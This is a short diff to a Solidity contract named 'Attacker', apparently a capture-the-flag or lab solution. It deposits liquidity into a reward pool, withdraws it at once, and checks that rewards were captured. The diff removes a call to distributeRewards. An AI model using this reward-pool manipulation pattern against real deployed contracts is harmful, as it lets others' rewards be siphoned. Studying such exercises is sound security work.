@@ -39,7 +39,6 @@ contract Attacker {
         );
         liquidity.approve(address(pool), _amount);
         pool.deposit(_amount);
-        pool.distributeRewards();
         pool.withdraw(_amount);
         uint playerReward = reward.balanceOf(address(this));
         require(playerReward > 0, "Didn't get rewards.");
